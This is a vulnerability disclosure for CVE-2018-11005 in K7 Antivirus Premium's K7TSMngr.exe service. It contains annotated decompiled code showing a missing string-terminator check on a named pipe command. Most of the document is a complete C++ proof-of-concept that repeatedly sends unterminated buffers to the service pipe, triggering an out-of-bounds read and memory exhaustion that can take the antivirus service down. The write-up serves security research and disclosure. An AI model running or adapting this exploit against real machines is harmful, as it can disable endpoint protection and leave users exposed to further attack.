# CVE-2018-11005

# Product / Component Affected

* **Product**: *K7 Antivirus Premium 16.0.0.0* 
* **Component**: *K7TSMngr.exe 16.0.0.70*
  * SHA256: E6655EBC79644E7DB6FC36B2D98DE88A9635F47B3ADF1D834FD357D5EA3E15A6

# K7TSMngr.exe Pipe Handler Background
*See description in [CVE-2018-8724](../CVE-2018-8724/readme.md)*

# Details
Using the named pipe \\\\.\\pipe\\K7TSMngrService1 and the function code 0x1003E, many of the commands **assume** there is a string following the 4 byte command/action and call *lstrlenA* on it. However, there is no check in place to verify this. Therefore you can pass in a command buffer without any zero terminators in and it will read off the end, potentially causing a crash of the service. The PoC code would have demonstrated this, however there is also a memory leak in the service and the PoC just causes the service to consume memory until it stops working! :(

```C++
typedef struct _unk_1003E
{
    DWORD dwAction;
    CHAR szSomething[256];  // This can be any length up to 0x8000 - 4
}


// sub_40CC40 snippet...

if ( (unsigned int)dwInSize < 4 || (unsigned int)dwInSize > 0x8000 )
    return 0;
dwCode = pInput->dwAction;
pszInputString = pInput->szSomething;
if ( pInput->dwAction == 'RMOV' )
{
    pszSource = pInput->szSomething;

    // VULN: pInput is the buffer I supply and szSomething is +4 into that. If I don't put a zero 
    // terminator on that string it is an out-of-bounds read. This could cause an access violation
    // crashing the service (which is useful for another bug), or potentially if it doesn't crash
    // could use other parts of the heap as part of a registry key, etc. There are a few options
    pszDest = &pszInputString[lstrlenA(pInput->szSomething) + 1];   

    // VULN: Same as above
    pInput = *(unk_1003E **)&pszDest[lstrlenA(pszDest) + 1];
    dwInSize = 0;
```
    

# PoC Code
```C++
#include <Windows.h>
#include <stdio.h>

/////////////////////////////////////
// Common code to talk to the Pipe //
/////////////////////////////////////
typedef struct _unk1
{
	DWORD dwMagic;
	DWORD dwSomeMagic;
	DWORD dwInSize;
	DWORD field_c;
	DWORD dwFunctionId;
	DWORD dwInputDataSize;
	DWORD dwOutputDataSize;
} unk1;

HANDLE g_hPipe = INVALID_HANDLE_VALUE;

BOOL InitPipe()
{
	g_hPipe = CreateFileA("\\\\.\\pipe\\K7TSMngrService1", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (g_hPipe == INVALID_HANDLE_VALUE)
	{
		printf("CreateFileW Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL CallPipeFunction(DWORD dwFunctionId, PBYTE pInput, DWORD dwInSize, PBYTE pOutput, DWORD dwOutSize)
{
	if (g_hPipe == INVALID_HANDLE_VALUE)
	{
		if (!InitPipe())
		{
			return FALSE;
		}
	}

	unk1 u1 = { 0 };
	u1.dwMagic = 0x4B375453;
	u1.dwSomeMagic = 0x1010;
	u1.dwInSize = 28;
	u1.dwFunctionId = dwFunctionId;
	u1.dwInputDataSize = dwInSize;

	DWORD dwBytesWritten = 0;
	if (!WriteFile(g_hPipe, &u1, sizeof(u1), &dwBytesWritten, NULL))
	{
		printf("WriteFile 1 Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	if (!WriteFile(g_hPipe, pInput, dwInSize, &dwBytesWritten, NULL))
	{
		printf("WriteFile 2 Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

PVOID AllocPrecise(DWORD dwSize)
{
	DWORD dwPageSize = ((dwSize + 4096 - 1) / 4096) * 4096;
	PBYTE pOffset = (PBYTE)VirtualAlloc(NULL, dwPageSize, MEM_COMMIT, PAGE_READWRITE);

	if (dwSize % 0x1000 == 0)
	{
		return pOffset;
	}
	pOffset += 4096 - (dwSize % 4096);
	return pOffset;
}
/////////////////////////////
// End of common pipe code //
/////////////////////////////

//
// Vulnerability:
//		Type: 
//			Out of Bounds Read, leading to a likely DoS
//
//		Description:
//			The general form of the put buffer is <4 Byte Id><Zero Terminated String>x2
//			However, there are no actual checks that there is a zero terminator within
//			the length of the buffer. Therefore it is easy to just send through a load
//			of buffers without any zeroes and when the services performs
//
//		Result:
//			While you can see an over-read happning, and it reading into the next heap entry
//			this PoC doesn't actually cause a crash regularly because of a memory leak in
//			the service. Specifically when you handle a Pipe Message, you allocate some
//			memory from the heap, but you don't appear to free that up everywhere. So 
//			spamming it with loads of requests, just eats up RAM until the process fails.
//
void Vuln_CodeFlaw_BufferOverReadExample()
{
	srand(0);

	// Hammer it :)
	while (TRUE)
	{
		// Action 'RMOV' 
		DWORD dwAction = 0x524D4F56;

		DWORD dwSize = rand() % 0x8000;
		if (dwSize < 4)
		{
			dwSize += 4;
		}
		PVOID pData = AllocPrecise(dwSize);

		memset(pData, 'A', dwSize);
		memcpy(pData, &dwAction, 4);

		// Setup our pipe connection
		if (!InitPipe())
		{
			printf("Error: InitPipe failed\r\n");
			VirtualFree(pData, 0, MEM_RELEASE);
			continue;
		}

		// This will trigger an over-read of the buffer.
		if (!CallPipeFunction(0x1003E, (PBYTE)pData, dwSize, NULL, 0))
		{
			printf("Error: CallPipeFunction failed");
			VirtualFree(pData, 0, MEM_RELEASE);
			continue;
		}

		VirtualFree(pData, 0, MEM_RELEASE);

		if (g_hPipe != INVALID_HANDLE_VALUE)
		{
			CloseHandle(g_hPipe);
			g_hPipe = INVALID_HANDLE_VALUE;
		}
	}
}


int main(int argc, char** argv)
{
	Vuln_CodeFlaw_BufferOverReadExample();
}


```

